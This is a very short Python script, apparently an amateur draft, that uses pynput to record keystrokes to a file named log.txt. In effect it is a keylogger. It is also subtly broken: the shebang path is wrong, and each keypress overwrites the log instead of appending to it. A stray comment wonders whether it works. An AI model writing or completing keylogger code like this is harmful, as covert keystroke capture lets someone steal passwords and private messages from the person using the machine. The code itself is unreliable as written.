#!/usr/lib/env python3
from pynput.keyboard import Listener
def on_press(key):
    with open('log.txt','w') as f:
        f.write(str(key))

with Listener(on_press) as listerner:
        listerner.join()
            # le me see if it works let se no